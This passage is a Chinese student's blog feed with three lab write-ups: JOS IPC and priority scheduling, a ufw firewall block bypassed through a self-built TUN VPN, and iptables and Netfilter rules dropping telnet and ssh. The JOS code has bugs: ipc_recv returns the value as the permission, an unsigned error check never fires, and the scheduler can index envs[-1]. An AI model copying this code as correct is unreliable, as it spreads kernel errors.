lib/ipc.c.</p></blockquote><p><code>sys_ipc_recv()</code>和<code>sys_ipc_try_send()</code>是怎么协作的：</p><ul><li><p>当某个进程调用<code>sys_ipc_recv()</code>后，该进程会阻塞（状态被置为<code>ENV_NOT_RUNNABLE</code>），直到另一个进程向它发送“消息”。当进程调用<code>sys_ipc_recv()</code>传入dstva参数时，表明当前进程准备接收页映射。</p></li><li><p>进程可以调用<code>sys_ipc_try_send()</code>向指定的进程发送“消息”，如果目标进程已经调用了<code>sys_ipc_recv()</code>，那么就发送数据，然后返回0，否则返回<code>-E_IPC_NOT_RECV</code>，表示目标进程不希望接受数据。当传入srcva参数时，表明发送进程希望和接收进程共享srcva对应的物理页。如果发送成功了发送进程的<code>srcva</code>和接收进程的<code>dstva</code>将指向相同的物理页。</p></li></ul><p><strong>sys_ipc_recv()</strong></p><p>需要实现的是进程接受ipc的函数。按惯例检查传入参数，然后分别设置进程自己的ipc接收状态和接收地址，将自己阻塞（状态设为<code>ENV_NOT_RUNNABLE</code>）最后调用<code>sched_yield()</code>运行其他程序即可</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_ipc_recv(<span class="hljs-keyword">void</span> *dstva)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">if</span>(dstva &lt; (<span class="hljs-keyword">void</span>*)UTOP &amp;&amp; PGOFF(dstva) != <span class="hljs-number">0</span>)<span class="hljs-keyword">return</span> -E_INVAL;curenv-&gt;env_ipc_recving = <span class="hljs-literal">true</span>;curenv-&gt;env_ipc_dstva = dstva;curenv-&gt;env_ipc_from = <span class="hljs-number">0</span>;curenv-&gt;env_status = ENV_NOT_RUNNABLE;sched_yield();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><strong>sys_ipc_try_send()</strong></p><p>实现了IPC的发送端函数，将一个值<code>value</code>和一个虚拟地址为<code>srcva</code>的内存页发送给指定的进程。在检查参数后，调用<code>page_lookup()</code>函数查找<code>srcva</code>对应的内存页，并用<code>page_insert()</code>将这个物理页映射给接收进程的指定地址<code>dstva</code>。通过直接设置目标进程的<code>env_ipc_value</code>值即可完成值的传递，并需要以同样方式告知对方发送程序的<code>envid</code>。</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_ipc_try_send(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">uint32_t</span> value, <span class="hljs-keyword">void</span> *srcva, <span class="hljs-keyword">unsigned</span> perm)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> * <span class="hljs-title">envstore</span>;</span><span class="hljs-keyword">if</span> (envid2env(envid, &amp;envstore, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_BAD_ENV;<span class="hljs-keyword">if</span> (envstore-&gt;env_ipc_recving == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_IPC_NOT_RECV;<span class="hljs-keyword">if</span> (srcva &lt; (<span class="hljs-keyword">void</span> *)UTOP) &#123;<span class="hljs-keyword">if</span> ((<span class="hljs-keyword">uintptr_t</span>)srcva % PGSIZE != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span> (((perm&amp;(~(PTE_U|PTE_P|PTE_AVAIL|PTE_W))) != <span class="hljs-number">0</span>)||((perm&amp;(PTE_U | PTE_P)) != (PTE_U | PTE_P))) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">pte_t</span>* pte;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pg</span> = <span class="hljs-title">page_lookup</span>(<span class="hljs-title">curenv</span>-&gt;<span class="hljs-title">env_pgdir</span>, <span class="hljs-title">srcva</span>, &amp;<span class="hljs-title">pte</span>);</span><span class="hljs-keyword">if</span> (pg == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span> ((perm &amp; PTE_W) &amp;&amp; !(*pte &amp; PTE_W)) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span> ((<span class="hljs-keyword">uintptr_t</span>)(envstore-&gt;env_ipc_dstva) &lt; UTOP) &#123;<span class="hljs-keyword">uint32_t</span> ret;<span class="hljs-keyword">if</span> ((ret = page_insert(envstore-&gt;env_pgdir, pg, envstore-&gt;env_ipc_dstva, perm)) != <span class="hljs-number">0</span>)<span class="hljs-keyword">return</span> ret;envstore-&gt;env_ipc_perm = perm;&#125;<span class="hljs-keyword">else</span> envstore-&gt;env_ipc_perm = <span class="hljs-number">0</span>;&#125;envstore-&gt;env_ipc_recving = <span class="hljs-number">0</span>;envstore-&gt;env_ipc_from = curenv-&gt;env_id;envstore-&gt;env_ipc_value = value;envstore-&gt;env_status = ENV_RUNNABLE;envstore-&gt;env_tf.tf_regs.reg_eax = <span class="hljs-number">0</span>;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><strong>ipc_recv()</strong></p><p>用户库函数中的ipc接收端。它的主要功能是在接收完成后，判断是否收到了信息，收到了则存入<code>from_env_store</code>和<code>perm_store</code>中，并返回ipc接受到的<code>value</code>。</p><pre><code class="hljs c++"><span class="hljs-keyword">int32_t</span>ipc_recv(<span class="hljs-keyword">envid_t</span> *from_env_store, <span class="hljs-keyword">void</span> *pg, <span class="hljs-keyword">int</span> *perm_store)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">if</span> (pg == <span class="hljs-literal">NULL</span>)pg = (<span class="hljs-keyword">void</span> *)KERNBASE;<span class="hljs-keyword">uint32_t</span> ret = sys_ipc_recv(pg);<span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">if</span> (from_env_store) *from_env_store = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> (perm_store) *perm_store = <span class="hljs-number">0</span>;<span class="hljs-keyword">return</span> ret;&#125;<span class="hljs-keyword">if</span> (from_env_store) *from_env_store =thisenv-&gt;env_ipc_from;<span class="hljs-keyword">if</span> (perm_store) *perm_store = thisenv-&gt;env_ipc_value;<span class="hljs-keyword">return</span> thisenv-&gt;env_ipc_value;&#125;</code></pre><p><strong>ipc_send()</strong></p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>ipc_send(<span class="hljs-keyword">envid_t</span> to_env, <span class="hljs-keyword">uint32_t</span> val, <span class="hljs-keyword">void</span> *pg, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">uint32_t</span> ret = <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (pg == <span class="hljs-literal">NULL</span>)pg = (<span class="hljs-keyword">void</span> *)KERNBASE;<span class="hljs-keyword">while</span> (ret != <span class="hljs-number">0</span>) &#123;ret = sys_ipc_try_send(to_env, val, pg, perm);<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span> &amp;&amp; ret != -E_IPC_NOT_RECV)panic(<span class="hljs-string">"ipc_send:%e"</span>, ret);sys_yield();&#125;&#125;</code></pre><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><h2 id="优先级调度"><a href="#优先级调度" class="headerlink" title="优先级调度"></a>优先级调度</h2><h3 id="优先级调度函数"><a href="#优先级调度函数" class="headerlink" title="优先级调度函数"></a>优先级调度函数</h3><p>我们要实现一个优先级调度函数<code>sched_priority_yield()</code>，作用是根据进程的优先级来选择所要运行的进程，而不是像之前一样，运行找到的第一个可运行进程</p><p>实现思路：此时的优先级应该是在Env结构中存储的，要修改env结构，在里面加入一项<strong>int env_priority</strong>来存储当前进程的优先级，并且在<code>env_alloc()</code>时初始化为-1，而之后的话就只是按照时间顺序来逐渐升高优先级</p><p>而我们的调度函数所要做的就是遍历所有的进程，找到可运行并且优先级最高的那个并且运行它</p><p>具体实现</p><pre><code class="hljs c++"><span class="hljs-comment">//choose a user environment that is both runnable and have the most priority </span><span class="hljs-keyword">void</span>sched_yield(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">idle</span>;</span><span class="hljs-keyword">uint32_t</span> env_index; <span class="hljs-keyword">uint32_t</span> first_env_index;<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint32_t</span> prior = <span class="hljs-number">0</span>;idle = thiscpu-&gt;cpu_env; <span class="hljs-keyword">if</span>(idle == <span class="hljs-literal">NULL</span>)  first_env_index = env_index = <span class="hljs-number">-1</span>; <span class="hljs-keyword">else</span>&#123;  first_env_index = env_index = ENVX(idle-&gt;env_id);  <span class="hljs-keyword">if</span>(idle-&gt;env_priority == <span class="hljs-number">-1</span>)<span class="hljs-comment">//等待时间越长，优先级越高</span>   idle-&gt;env_priority = prior++;&#125; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; NENV; i++)&#123;  <span class="hljs-keyword">uint32_t</span> n = (env_index + i) % NENV;  <span class="hljs-comment">//给没有被调度过的进程设置优先级</span> <span class="hljs-keyword">if</span>(envs[n].env_status == ENV_RUNNABLE &amp;&amp; envs[n].env_priority == <span class="hljs-number">-1</span>)  envs[n].env_priority = prior++;  <span class="hljs-comment">//找到优先级最高的进程</span>  <span class="hljs-keyword">if</span>(envs[n].env_status == ENV_RUNNABLE &amp;&amp; envs[n].env_priority &gt; envs[first_env_index].env_priority)   first_env_index = n; &#125; <span class="hljs-keyword">if</span>(first_env_index != <span class="hljs-number">-1</span>)&#123; env_run(&amp;envs[first_env_index]); <span class="hljs-keyword">return</span>; &#125; <span class="hljs-keyword">if</span>(idle &amp;&amp; idle-&gt;env_status == ENV_RUNNING)&#123; env_run(idle); <span class="hljs-keyword">return</span>; &#125;sched_halt();&#125;</code></pre><p>之后我们需要参考user/yield.c来实现我们的测试文件，我是在原来的基础上直接修改的</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inc/lib.h&gt;</span></span><span class="hljs-keyword">void</span>umain(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)&#123;    <span class="hljs-keyword">int</span> i;cprintf(<span class="hljs-string">"Hello, I am environment %08x. Priority: %d\n"</span>, thisenv-&gt;env_id, thisenv-&gt;env_priority);<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;sys_yield();cprintf(<span class="hljs-string">"Back in environment %08x, iteration %d.\n"</span>, thisenv-&gt;env_id, i);&#125;cprintf(<span class="hljs-string">"All done in environment %08x.\n"</span>, thisenv-&gt;env_id);&#125;</code></pre><p>运行结果</p><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/4-1.png" srcset="/img/loading.gif" alt="4-1"></p><h2 id="问题回答"><a href="#问题回答" class="headerlink" title="问题回答"></a>问题回答</h2><ul><li><h3 id="详细描述JOS启动多个APs的过程"><a href="#详细描述JOS启动多个APs的过程" class="headerlink" title="详细描述JOS启动多个APs的过程"></a>详细描述JOS启动多个APs的过程</h3></li></ul><p>在<code>kern/init.c</code>当中，BSP通过运行<code>i386_init()</code>来完成内存、进程等的初始化，之后就开始了APs的初始化过程，通过调用<code>mp_init()</code>以及<code>lapic_init()</code>两个函数来完成基本的信息收集以及APIC初始化</p><p><code>mp_init()</code>首先从BIOS中获取多处理器配置信息。在BIOS所在的内存区中可以读取MP配置表获得CPU总数，<code>APIC ID</code>，<code>LAPIC</code>的内存映射地址等。随后则由<code>lapic_init()</code>初始化<code>LAPIC</code>上的寄存器。</p><p>在得到基本的CPU信息之后，会转到<code>boot_aps()</code>，由它来一个一个的启动找到的APs。</p><p>在<code>mpentry</code>中，AP从实模式启动，这里与boot.S类似。这时会进行寄存器初始化，<code>GDT</code>载入，设置页表和分页，初始化堆栈等工作。完成后<code>mpentry</code>会调用<code>mp_main()</code>继续进行AP启动工作，设置页表目录，建立<code>LAPIC</code>的<code>MMIO</code>映射，初始化<code>GDT</code>与<code>TSS</code>，设置CPU状态。</p><p>回到<code>boot_aps()</code>，只有当程序确认一个AP启动完成（CPU状态为<code>CPU_STARTED</code>）后，才会继续启动下一个AP；否则会一直忙等。</p><ul><li><h3 id="详细描述JOS中执行COW-fork时，-用户程序一次执行了哪些步骤，这些步骤包含哪些系统调用？"><a href="#详细描述JOS中执行COW-fork时，-用户程序一次执行了哪些步骤，这些步骤包含哪些系统调用？" class="headerlink" title="详细描述JOS中执行COW fork时， 用户程序一次执行了哪些步骤，这些步骤包含哪些系统调用？"></a>详细描述JOS中执行COW fork时， 用户程序一次执行了哪些步骤，这些步骤包含哪些系统调用？</h3></li></ul><ol><li><p>当一个用户程序调用COW fork（即lib中的 <code>fork()</code>）时，<code>fork()</code>首先会将用户程序的页错误处理程序设置为COW专用的<code>pgfault()</code>函数</p></li><li><p>随后会调用<code>sys_exofork()</code>来实现基本的fork进程创建。</p></li></ol><p>在这些步骤中，第一步会涉及到<code>sys_page_alloc()</code>（分配异常处理栈）和<code>sys_env_set_pgfault_upcall()</code>（设置页错误处理程序）。而在用<code>duppage()</code>复制COW页过程中，则会调用<code>sys_getenvid()</code>和<code>sys_page_map()</code>两个系统调用。最后还会用到<code>sys_env_set_status()</code>设定进程状态。</p><ul><li><h3 id="详细描述当进程发生COW相关page-fault时，这个中断是如何被处理的？哪些步骤在内核中，哪些步骤在用户空间中？"><a href="#详细描述当进程发生COW相关page-fault时，这个中断是如何被处理的？哪些步骤在内核中，哪些步骤在用户空间中？" class="headerlink" title="详细描述当进程发生COW相关page fault时，这个中断是如何被处理的？哪些步骤在内核中，哪些步骤在用户空间中？"></a>详细描述当进程发生COW相关page fault时，这个中断是如何被处理的？哪些步骤在内核中，哪些步骤在用户空间中？</h3></li></ul><ol><li><p>在用户程序发生一个页错误后，系统都会陷入内核，调用一般的内核中断处理程序。当中断处理被分发给trap.c中的<code>page_fault_handler()</code>中后，内核的页错误处理程序则会将<code>UTrapframe</code>压入<code>Exception Stack</code>，并开始运行进程自己的COW页错误处理程序<code>pgfault()</code>。</p></li><li><p>之后系统又一次回到用户态，并且执行完成后直接回到用户进程。而在<code>pgfault()</code>中，处理函数会判断页错误类型是否是写入一个COW页面造成的，如果是则将要写入的COW页复制一个，并分配给当前进程的内存空间。</p></li></ol><ul><li><h3 id="user-primes-c-这段代码很有趣，请详细解释这段代码如何执行，画出代码流程图，并指出所谓的素数体现在哪"><a href="#user-primes-c-这段代码很有趣，请详细解释这段代码如何执行，画出代码流程图，并指出所谓的素数体现在哪" class="headerlink" title="user/primes.c 这段代码很有趣，请详细解释这段代码如何执行，画出代码流程图，并指出所谓的素数体现在哪"></a>user/primes.c 这段代码很有趣，请详细解释这段代码如何执行，画出代码流程图，并指出所谓的素数体现在哪</h3></li></ul><p>这段代码实际上就是由一个进程创建一个子进程后，不断地给子进程发送一些数字。每个被创建出来的子进程同样会再创建出一个孩子进程，然后不断给子进程发送数字。main进程发送从2开始的自然数给子进程，子进程留下第一个数字2，即为这个子进程找到的素数。而后子进程会将所有2的倍数筛掉，将剩下的数字再发给自己的子进程（这里也就是main进程子进程的子进程），由被fork出的进程重复这个过程。而每个进程留下的第一个数字一定是素数，因为这个数已经被比他小的数字检验过了–如果是比他小的数字的倍数，会被筛选掉。而这样每个进程就都能够找到一个素数。</p><p>代码流程图：</p><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/5.png" srcset="/img/loading.gif" alt="5"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Operating System</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Firewall_VPN</title>
    <link href="/2020/12/02/Firewall-VPN/"/>
    <url>/2020/12/02/Firewall-VPN/</url>
    
    <content type="html"><![CDATA[<h1 id="Firewall-VPN"><a href="#Firewall-VPN" class="headerlink" title="Firewall_VPN"></a>Firewall_VPN</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>在这里，主要是想要对于防火墙的过滤以及对应的VPN（虚拟私人网络）来进行绕过，希望对于VPN的原理能够有一个比较全面的了解</p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task1：VM设置"><a href="#task1：VM设置" class="headerlink" title="task1：VM设置"></a>task1：VM设置</h3><ul><li><p>VM1</p><p>  <img src="/2020/12/02/Firewall-VPN/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p></li><li><p>VM2</p><p>  <img src="/2020/12/02/Firewall-VPN/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p></li></ul><h3 id="task2：设置防火墙"><a href="#task2：设置防火墙" class="headerlink" title="task2：设置防火墙"></a>task2：设置防火墙</h3><p>在这里设置对应的目标网站为<a href="http://www.fudan.edu.cn，通过nslookup查询可知，目标主机IP为202.120.224.81" target="_blank" rel="noopener">www.fudan.edu.cn，通过nslookup查询可知，目标主机IP为202.120.224.81</a></p><blockquote><p>在设置对应的防火墙规则前，我们不能在路由之前进行设置，并且只能在真实的网络接口上面进行设置，而不是在虚拟网络接口上进行设置</p></blockquote><p><img src="/2020/12/02/Firewall-VPN/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>执行对应的下面的命令</p><pre><code class="hljs angelscript">sudo ufw enablesudo ufw deny <span class="hljs-keyword">out</span> on enp0s3 to <span class="hljs-number">202.120</span><span class="hljs-number">.224</span><span class="hljs-number">.81</span>sudo ufw status</code></pre><p><img src="/2020/12/02/Firewall-VPN/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p><p>之后清理浏览器缓存并且访问<a href="http://www.fudan.edu.cn，会发现访问被拒绝" target="_blank" rel="noopener">www.fudan.edu.cn，会发现访问被拒绝</a></p><p><img src="/2020/12/02/Firewall-VPN/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><h3 id="task3：通过VPN来绕过防火墙"><a href="#task3：通过VPN来绕过防火墙" class="headerlink" title="task3：通过VPN来绕过防火墙"></a>task3：通过VPN来绕过防火墙</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>VM2是一台在防火墙的内网外面的主机，而VM1之所以能绕过防火墙，是通过VM1和VM2之间VPN通道来实现的</p><p>疑问：</p><ul><li>数据包在VPN隧道里面是通过什么协议来实现的</li><li>对应的虚拟网卡是怎么产生的/怎么工作的呢</li></ul><p><img src="/2020/12/02/Firewall-VPN/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><blockquote><p>The vpnclient and vpnserver programs are the two ends of a VPN tunnel. They communicate with each other using either TCP or UDP via the sockets depicted in Figure 3. In our sample code, we choose to use UDP for the sake of simplicity. The dotted line between the client and server depicts the path for the VPN tunnel. The VPN client and server programs connect to the hosting system via a TUN interface, through which they do two things: (1) get IP packets from the hosting system, so the packets can be sent through the tunnel, (2) get IP packets from the tunnel, and then forward it to the hosting system, which will forward the packet to its final destination.</p></blockquote><h4 id="step1：运行VPNserver"><a href="#step1：运行VPNserver" class="headerlink" title="step1：运行VPNserver"></a>step1：运行VPNserver</h4><p>所要做的无非就是两步：1. 建立一个虚拟网卡，给它分配IP地址并让它等待连接 2.打开端口转发功能，让主机作为路由器/网关来出现</p><p><img src="/2020/12/02/Firewall-VPN/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p><img src="/2020/12/02/Firewall-VPN/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><h4 id="step2：运行VPN客户端"><a href="#step2：运行VPN客户端" class="headerlink" title="step2：运行VPN客户端"></a>step2：运行VPN客户端</h4><p>和上面所做的没有什么不同</p><p><img src="/2020/12/02/Firewall-VPN/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><h4 id="step3：在VPN服务端和客户端之间设置路由"><a href="#step3：在VPN服务端和客户端之间设置路由" class="headerlink" title="step3：在VPN服务端和客户端之间设置路由"></a>step3：在VPN服务端和客户端之间设置路由</h4><p>当我们在建立网络的时候，还需要说能够进行基本的通信，这也就需要我们进行路由表的设置，将一些包有选择的放到对应的接口上面去，运行下面的命令并且检查对应的路由表，将对应IP地址为202.120.224.81的IP数据包发往对应的tun0接口</p><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> route </span><span class="hljs-builtin-name">add</span> -host 202.120.224.81 tun0</code></pre><p><img src="/2020/12/02/Firewall-VPN/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><h4 id="step4：在服务器VM上面设置NAT"><a href="#step4：在服务器VM上面设置NAT" class="headerlink" title="step4：在服务器VM上面设置NAT"></a>step4：在服务器VM上面设置NAT</h4><p>为什么会先发给VPN server端的主机</p><p>首先要对于VPN整个过程有个了解，当内网中的A要访问外部网址的时候，首先会产生一个数据包，之后当这个数据包查询本地的路由表的时候，会发现用于发送该数据包的IP地址为主机A的外网网tun0，而目标地址是主机B的外网网关。而当主机B的外网网关收到该数据包的时候，会剥离外面的头部字段并且重新生成新的数据包，之后进行访问对应的外部网址</p><p><strong>总的来说，相当于是将主机A的接受服务放到了B的上面，让B来替A进行访问，所以返回的报文理所当然的是要先到B</strong></p><p>参考：<a href="https://zhuanlan.zhihu.com/p/127785818" target="_blank" rel="noopener">VPN过程</a>、<a href="http://huyue.xn--6qq986b3xl/2019/08/01/VPN%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/#VPN%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86" target="_blank" rel="noopener">VPN工作原理</a></p><p>当我们上面步骤都做完之后，可以在client和server端分别看到以下内容</p><p><img src="/2020/12/02/Firewall-VPN/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><p><img src="/2020/12/02/Firewall-VPN/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p>对数据包的分析</p><p><img src="/2020/12/02/Firewall-VPN/3-7.PNG" srcset="/img/loading.gif" alt="3-7"></p><p>在这里我们可以发现，首先，当发送数据包的时候，192.168.53.5其实也会向目标地址发送数据包，而10.0.2.5在这里其实相当于是扮演了VPN网关，所有的宝石加上是由10.0.2.5来进行传输出去的，而之后当收到这个包的时候，会转发到对应的192.168.53.5，之后对应的socket可以得到相应的数据</p><p>参考blog：<a href="https://cshihong.github.io/2019/05/11/SSL-VPN%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">SSL_VPN技术原理</a>以及NAT网络：</p><p><img src="/2020/12/02/Firewall-VPN/3-8.PNG" srcset="/img/loading.gif" alt="3-8"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuc Firewall Exploration</title>
    <link href="/2020/11/30/Linuc-Firewall-Exploration/"/>
    <url>/2020/11/30/Linuc-Firewall-Exploration/</url>
    
    <content type="html"><![CDATA[<h1 id="Firewall-Exploration"><a href="#Firewall-Exploration" class="headerlink" title="Firewall Exploration"></a>Firewall Exploration</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote><p>防火墙的本质是查看对应的会话表，根据会话表中不同的内容和规则对数据包采取不同的操作</p></blockquote><p>防火墙主要工作在网络层</p><p><a href="http://www.zsythink.net/archives/1199" target="_blank" rel="noopener">iptables详解</a></p><p><a href="http://www.zsythink.net/archives/tag/iptables/page/2/" target="_blank" rel="noopener">IPtables系列讲解</a></p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task1：使用防火墙"><a href="#task1：使用防火墙" class="headerlink" title="task1：使用防火墙"></a>task1：使用防火墙</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当我们对于链、规则以及表有了一个初始概念的时候就可以做了，这里面明显要进行的就是过滤，这里是在A上面进行的防火墙设置，所以此时明显要操作的是input和output链</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><ul><li><p>防止A（10.0.2.4）对B（10.0.2.5）进行telnet操作</p><p>  这时候在A的output链上面添加filter表规则（防火墙运行在A上面），输入命令</p></li></ul><pre><code class="hljs angelscript">sudo iptables -A OUTPUT -d <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.5</span> -j DROP</code></pre><p>之后查看对应的filter表的内容并且ping 10.0.2.5，会发现一直在trying，阻止telnet成功</p><ul><li><p>防止B对A进行telnet操作</p><p>  一样的道理，首先未设置防火墙规则的时候在B上telnet A（10.0.2.4），发现可以登录</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p><p>  之后在A上面设置INPUT链的filter表规则</p></li></ul><pre><code class="hljs angelscript">sudo iptables -A INPUT -s <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.5</span> -j DROP</code></pre><p>运行并查看filter表规则</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p><p>此时在B上进行telnet会发现无法连接上</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-6.PNG" srcset="/img/loading.gif" alt="1-6"></p><ul><li>阻止A对外部网站的访问</li></ul><p>以百度为例，百度对应的IP地址为182.61.200.6和182.61.200.7，将其添加到对应的OUTPUT链里面，在添加前可以正常访问百度</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-7.PNG" srcset="/img/loading.gif" alt="1-7"></p><p>运行以下命令</p><pre><code class="hljs angelscript">sudo iptables -A OUTPUT -d <span class="hljs-number">182.61</span><span class="hljs-number">.200</span><span class="hljs-number">.6</span> -j DROPsudo iptables -A OUTPUT -d <span class="hljs-number">182.61</span><span class="hljs-number">.200</span><span class="hljs-number">.7</span> -j DROP</code></pre><p>此时的filter表</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-8.PNG" srcset="/img/loading.gif" alt="1-8"></p><p>采取ping操作来访问，操作不被允许，访问失败</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/1-9.PNG" srcset="/img/loading.gif" alt="1-9"></p><h3 id="task2：实现一个简单的防火墙"><a href="#task2：实现一个简单的防火墙" class="headerlink" title="task2：实现一个简单的防火墙"></a>task2：实现一个简单的防火墙</h3><blockquote><p>LKM允许我们在运行期间给内核添加一个新的模块。这种新的模块使我们能扩展内核功能，而无需重建核心甚至是重启电脑。作为LKM中防火墙的包过滤部分是可以被实现的。然而，这还不够。为了使过滤模块能够阻止传入/传出的数据包，必须将模块插入到数据包处理路径中。</p><p>Netfilter旨在促进授权用户对数据包的操作。Netfilter通过在Linux内核中实现许多<em>hooks</em>来实现此目标。这些钩子被插入到多个地点，包括数据包流入与流出的路径。如果我们想操作流入的数据包，我们只需要连接我们的程序（在LKM内）到相应的钩子上即可。当一个流入数据包到达，我们的程序将被唤醒。我们的程序可以决定这个数据包是否该被阻止或是放行；此外，我们还可以在程序中修改数据包。</p><p>我们写了一个调用hook_func的函数，当满足nf_hook_ops条件的包出现时，它就会被调用。这个函数执行适当的逻辑，在我们的例子中就是丢弃数据包。我们填入nf_hook_ops结构，它定义了特定的Netfilter钩子到target target，它的优先级(如果你有多个钩子，这很重要)，并给目标包的类型(在本例中是IPV4)，并将hook_func绑定到它</p></blockquote><p>在这里除了task1之外新增了两个规则：阻止A到B的SSH连接以及阻止B到A的SSH连接</p><p>一定不要让自己的文件夹有空格！！！！！</p><h4 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h4><p>终于make成功了</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><p>之后加载模块，加载成功</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><p>并且确保此时的filter表为空</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>之后开始测试</p><ul><li><p>首先是A（10.0.2.4）到B（10.0.2.5）的telnet和ssh测试，可以看到这些包都被drop掉了并且connection没有建立</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p></li><li><p>之后是B到A的telnet和ssh测试，可以看到后面六条记录记录了从B到A进行telnet和ssh操作时被drop掉的包</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p></li><li><p>最后是访问从A访问百度的测试，在浏览器上访问百度</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p></li></ul><p><strong>code</strong></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/kernel.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/module.h&gt;</span></span><span class="hljs-meta">#<span 